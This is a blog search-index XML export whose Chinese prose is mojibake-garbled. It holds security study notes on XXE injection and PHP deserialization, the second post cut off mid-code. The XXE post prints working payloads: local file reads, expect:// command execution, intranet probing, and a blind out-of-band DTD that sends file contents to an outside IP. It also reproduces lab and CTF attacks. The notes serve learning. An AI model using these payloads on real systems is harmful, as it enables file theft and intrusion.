<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>39WEBæ¼æ´-XXEåŠXMLä¹‹åˆ©ç”¨æ£€æµ‹ç»•è¿‡å…¨è§£</title>
      <link href="/2021/09/23/39WEB%E6%BC%8F%E6%B4%9E-XXE%E5%8F%8AXML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/"/>
      <url>/2021/09/23/39WEB%E6%BC%8F%E6%B4%9E-XXE%E5%8F%8AXML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>XXEæ¥äº†ï¼Œå­¦å®Œxmlæœç„¶å¥½å­¦å¤šäº†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>XML è¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼ŒXML æ–‡æ¡£ç»“æ„åŒ…æ‹¬ XML å£°æ˜ã€DTD æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ï¼Œå…¶æŠŠæ•°æ®ä» HTML åˆ†ç¦»ï¼Œæ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚XXE æ¼æ´å…¨ç§°XML External Entity Injectionï¼Œå³ xml å¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXE æ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æ XML è¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211942169.png" alt="image-20210921194245902"></p><h3 id="XML-ä¸-HTML-çš„ä¸»è¦å·®å¼‚"><a href="#XML-ä¸-HTML-çš„ä¸»è¦å·®å¼‚" class="headerlink" title="XML ä¸ HTML çš„ä¸»è¦å·®å¼‚"></a>XML ä¸ HTML çš„ä¸»è¦å·®å¼‚</h3><ul><li>XML è¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚</li><li>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚</li><li>HTML æ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ ï¼Œè€Œ XML æ—¨åœ¨ä¼ è¾“ä¿¡æ¯ã€‚</li></ul><h3 id="æ£€æµ‹XXEæ¼æ´"><a href="#æ£€æµ‹XXEæ¼æ´" class="headerlink" title="æ£€æµ‹XXEæ¼æ´"></a>æ£€æµ‹XXEæ¼æ´</h3><p>1.é€šè¿‡æ•°æ®åŒ…è¿›è¡Œåˆ¤æ–­ï¼Œé€šè¿‡åˆ¤æ–­æ•°æ®åŒ…ä¸­Content-Typeçš„å€¼ï¼Œå¦‚æœå€¼ä¸º<code>text/xml</code>æˆ–è€…<code>application/xml</code>ï¼Œé‚£ä¹ˆæ¥æ”¶çš„å°±æ˜¯xmlæ ¼å¼çš„æ•°æ®ã€‚</p><p>2.é€šè¿‡ä¼ é€’çš„æ•°æ®æ ¼å¼è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚<code>&lt;user&gt;test&lt;/user&gt;&lt;pass&gt;Mikasa&lt;/pass&gt;</code>è¿™ç§ã€‚</p><p>3.é€šè¿‡æ›´æ”¹Content-Typeå€¼çœ‹è¿”å›ç»“æœï¼Œä¿®æ”¹æˆxmlæ ¼å¼ã€‚</p><h3 id="ç©æ³•-è¯»æ–‡ä»¶"><a href="#ç©æ³•-è¯»æ–‡ä»¶" class="headerlink" title="ç©æ³•-è¯»æ–‡ä»¶"></a>ç©æ³•-è¯»æ–‡ä»¶</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///d://test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h3 id="ç©æ³•-å†…ç½‘æ¢é’ˆæˆ–æ”»å‡»å†…ç½‘åº”ç”¨ï¼ˆè§¦å‘æ¼æ´åœ°å€ï¼‰"><a href="#ç©æ³•-å†…ç½‘æ¢é’ˆæˆ–æ”»å‡»å†…ç½‘åº”ç”¨ï¼ˆè§¦å‘æ¼æ´åœ°å€ï¼‰" class="headerlink" title="ç©æ³•-å†…ç½‘æ¢é’ˆæˆ–æ”»å‡»å†…ç½‘åº”ç”¨ï¼ˆè§¦å‘æ¼æ´åœ°å€ï¼‰"></a>ç©æ³•-å†…ç½‘æ¢é’ˆæˆ–æ”»å‡»å†…ç½‘åº”ç”¨ï¼ˆè§¦å‘æ¼æ´åœ°å€ï¼‰</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://192.168.1.15/test.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;rabbit;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h3 id="ç©æ³•-RCE"><a href="#ç©æ³•-RCE" class="headerlink" title="ç©æ³•-RCE"></a>ç©æ³•-RCE</h3><p>è¯¥ CASE æ˜¯åœ¨å®‰è£… expect æ‰©å±•çš„ PHP ç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p>&lt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h3 id="å¼•å…¥å¤–éƒ¨å®ä½“-dtd"><a href="#å¼•å…¥å¤–éƒ¨å®ä½“-dtd" class="headerlink" title="å¼•å…¥å¤–éƒ¨å®ä½“ dtd"></a>å¼•å…¥å¤–éƒ¨å®ä½“ dtd</h3><p>æ¡ä»¶:çœ‹å¯¹æ–¹æœ‰æ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1/evil2.dtd&quot;&gt;</span><br><span class="line">%file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;send;&lt;/x&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">evil2.dtd:</span><br><span class="line">&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="æ— å›æ˜¾-è¯»å–æ–‡ä»¶"><a href="#æ— å›æ˜¾-è¯»å–æ–‡ä»¶" class="headerlink" title="æ— å›æ˜¾-è¯»å–æ–‡ä»¶"></a>æ— å›æ˜¾-è¯»å–æ–‡ä»¶</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1/evil2.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test.dtdï¼š</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://192.168.1.15/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">\&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><h3 id="åè®®-è¯»æ–‡ä»¶ï¼ˆç»•è¿‡ï¼‰"><a href="#åè®®-è¯»æ–‡ä»¶ï¼ˆç»•è¿‡ï¼‰" class="headerlink" title="åè®®-è¯»æ–‡ä»¶ï¼ˆç»•è¿‡ï¼‰"></a>åè®®-è¯»æ–‡ä»¶ï¼ˆç»•è¿‡ï¼‰</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><h3 id="xxe-lab-é¶åœºç™»é™†æ¡†-xml-æ•°æ®ä¼ è¾“æµ‹è¯•-æ£€æµ‹å‘ç°"><a href="#xxe-lab-é¶åœºç™»é™†æ¡†-xml-æ•°æ®ä¼ è¾“æµ‹è¯•-æ£€æµ‹å‘ç°" class="headerlink" title="xxe-lab é¶åœºç™»é™†æ¡† xml æ•°æ®ä¼ è¾“æµ‹è¯•-æ£€æµ‹å‘ç°"></a>xxe-lab é¶åœºç™»é™†æ¡† xml æ•°æ®ä¼ è¾“æµ‹è¯•-æ£€æµ‹å‘ç°</h3><p>æŠ“åŒ…å‘ç°ä¼ è¾“æ•°æ®æ˜¯xmlæ ¼å¼</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109231545638.png" alt="image-20210923154533388"></p><p>xxeæ”»å‡»æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///d://test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;AmJpA6jZ6DN2N35&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109231547664.png" alt="image-20210923154720588"></p><h3 id="CTF-Jarvis-OJ-Web-XXE-å®‰å…¨çœŸé¢˜å¤ç°-æ•°æ®è¯·æ±‚æ ¼å¼"><a href="#CTF-Jarvis-OJ-Web-XXE-å®‰å…¨çœŸé¢˜å¤ç°-æ•°æ®è¯·æ±‚æ ¼å¼" class="headerlink" title="CTF-Jarvis-OJ-Web-XXE å®‰å…¨çœŸé¢˜å¤ç°-æ•°æ®è¯·æ±‚æ ¼å¼"></a>CTF-Jarvis-OJ-Web-XXE å®‰å…¨çœŸé¢˜å¤ç°-æ•°æ®è¯·æ±‚æ ¼å¼</h3><p>æ²¡æœ‰ä»€ä¹ˆç‰¹å¾ï¼Œè¿™é‡Œå› ä¸ºæ˜¯å¤ç°xxeï¼Œæ‰€æœ‰ç›²çŒœæ˜¯xxe</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109231638398.png" alt="image-20210923155214976"></p><p>è¿™é‡Œéœ€è¦ä¿®æ”¹ä¿©ä¸ªåœ°æ–¹</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109231553654.png" alt="image-20210923155344561"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¯»å–åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;XxE_15_n0T_S7range_Enough&#125;</span><br></pre></td></tr></table></figure><h3 id="xxe-å®‰å…¨æ¼æ´è‡ªåŠ¨åŒ–æ³¨å°„è„šæœ¬å·¥å…·-XXEinjector-Ruby"><a href="#xxe-å®‰å…¨æ¼æ´è‡ªåŠ¨åŒ–æ³¨å°„è„šæœ¬å·¥å…·-XXEinjector-Ruby" class="headerlink" title="xxe å®‰å…¨æ¼æ´è‡ªåŠ¨åŒ–æ³¨å°„è„šæœ¬å·¥å…·-XXEinjector(Ruby)"></a>xxe å®‰å…¨æ¼æ´è‡ªåŠ¨åŒ–æ³¨å°„è„šæœ¬å·¥å…·-XXEinjector(Ruby)</h3><h4 id="ä½¿ç”¨æ•™ç¨‹"><a href="#ä½¿ç”¨æ•™ç¨‹" class="headerlink" title="ä½¿ç”¨æ•™ç¨‹"></a>ä½¿ç”¨æ•™ç¨‹</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/bmjoker/p/9614990.html</span><br></pre></td></tr></table></figure><h4 id="ä¸‹è½½åœ°å€"><a href="#ä¸‹è½½åœ°å€" class="headerlink" title="ä¸‹è½½åœ°å€"></a>ä¸‹è½½åœ°å€</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/enjoiz/XXEinjector</span><br></pre></td></tr></table></figure><h3 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h3><ul><li><a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></li><li><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></li><li><a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></li><li><a href="https://download.vulnhub.com/xxe/XXE.zip">https://download.vulnhub.com/xxe/XXE.zip</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/9614990.html">https://www.cnblogs.com/bmjoker/p/9614990.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>37WEBæ¼æ´-ååºåˆ—åŒ–ä¹‹PHP</title>
      <link href="/2021/09/21/37WEB%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP/"/>
      <url>/2021/09/21/37WEB%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP/</url>
      
        <content type="html"><![CDATA[<p>ç›®å‰åªçœ‹å¾—æ‡‚PHPçš„ååºåˆ—åŒ–ï¼Œjavaæ²¡æœ‰å­¦è¿‡ï¼Œç­‰å­¦åˆ°äº†å†çœ‹</p><span id="more"></span><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211120475.png" alt="image-20210920201006104"></p><h2 id="PHP-ååºåˆ—åŒ–"><a href="#PHP-ååºåˆ—åŒ–" class="headerlink" title="PHP ååºåˆ—åŒ–"></a>PHP ååºåˆ—åŒ–</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>æœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œå¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQL æ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœã€‚åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è‡ªåŠ¨è§¦å‘äº†æŸäº›é­”æœ¯æ–¹æ³•ã€‚å½“è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±æœ‰å¯èƒ½ä¼šè§¦å‘å¯¹è±¡ä¸­çš„ä¸€äº›é­”æœ¯æ–¹æ³•ã€‚</p><h3 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h3><ul><li><p>serialize()         //å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²</p></li><li><p>unserialize()    //å°†å­—ç¬¦ä¸²è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è§¦å‘ï¼šunserialize å‡½æ•°çš„å˜é‡å¯æ§ï¼Œæ–‡ä»¶ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„ç±»ï¼Œç±»ä¸­æœ‰é­”æœ¯æ–¹æ³•</span><br></pre></td></tr></table></figure></li><li><p>__construct()       //åˆ›å»ºå¯¹è±¡æ—¶è§¦å‘</p></li><li><p>__destruct()        //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</p></li><li><p>__call()              //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</p></li><li><p>__callStatic()     //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</p></li><li><p>__get()              //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</p></li><li><p>__set()             //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</p></li><li><p>__isset()           //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨ isset()æˆ– empty()è§¦å‘</p></li><li><p>__unset()          //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨ unset()æ—¶è§¦å‘</p></li><li><p>__invoke()        //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</p></li></ul><h3 id="å…¶ä»–é­”æœ¯æ–¹æ³•"><a href="#å…¶ä»–é­”æœ¯æ–¹æ³•" class="headerlink" title="å…¶ä»–é­”æœ¯æ–¹æ³•"></a>å…¶ä»–é­”æœ¯æ–¹æ³•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/20175211lyz/p/11403397.html</span><br></pre></td></tr></table></figure><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211120425.png" alt="image-20210920211557551"></p><h3 id="æ— ç±»"><a href="#æ— ç±»" class="headerlink" title="æ— ç±»"></a>æ— ç±»</h3><h4 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h4><p>å°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„è¿‡ç¨‹ç§°ä¸ºåºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;zpzp&#x27;</span>;</span><br><span class="line"><span class="variable">$num</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$key</span>);   <span class="comment">//å°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$num</span>);   <span class="comment">//å°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;zpzp&quot;</span>;<span class="comment">//å…¶ä¸­sä»£è¡¨çš„æ˜¯æ•°æ®ç±»å‹,4ä»£è¡¨çš„æ˜¯æ•°æ®é•¿åº¦ï¼Œ&quot;zpzp&quot;ä»£è¡¨æ•°æ®å†…å®¹</span></span><br><span class="line">i:<span class="number">123</span>;<span class="comment">//åŒç†,iä»£è¡¨çš„æ˜¯int,ä¸è¿‡intç±»å‹æ²¡æœ‰é•¿åº¦</span></span><br></pre></td></tr></table></figure><h4 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h4><p>å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ç§°ä¸ºååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;s:5:&quot;hello&quot;;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$key</span>);    <span class="comment">//å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹è±¡</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &gt;&gt;&gt;&gt;</span><br><span class="line">hello</span><br></pre></td></tr></table></figure><h3 id="æœ‰ç±»"><a href="#æœ‰ç±»" class="headerlink" title="æœ‰ç±»"></a>æœ‰ç±»</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="comment">//å¯¹è±¡è¢«åˆ›å»ºæ—¶è§¦å‘</span></span><br><span class="line">        <span class="variable">$test</span> =<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;è°ƒç”¨äº†æ„é€ å‡½æ•°&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;è°ƒç”¨äº†ææ„å‡½æ•°&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//è°ƒç”¨unserializeå‡½æ•°æ—¶è§¦å‘</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;è°ƒç”¨äº†è‹é†’å‡½æ•°&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;åˆ›å»ºå¯¹è±¡ a&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ABC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;åºåˆ—åŒ–&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_ser</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_ser</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ååºåˆ—åŒ–&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_unser</span> = unserialize(<span class="variable">$a_ser</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;å¯¹è±¡å¿«è¦æ­»äº†ï¼&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">åˆ›å»ºå¯¹è±¡ a</span><br><span class="line">è°ƒç”¨äº†æ„é€ å‡½æ•°</span><br><span class="line">åºåˆ—åŒ–</span><br><span class="line">O:<span class="number">3</span>:<span class="string">&quot;ABC&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;N;&#125;</span><br><span class="line">ååºåˆ—åŒ–</span><br><span class="line">è°ƒç”¨äº†è‹é†’å‡½æ•°</span><br><span class="line">å¯¹è±¡å¿«è¦æ­»äº†ï¼è°ƒç”¨äº†ææ„å‡½æ•°</span><br><span 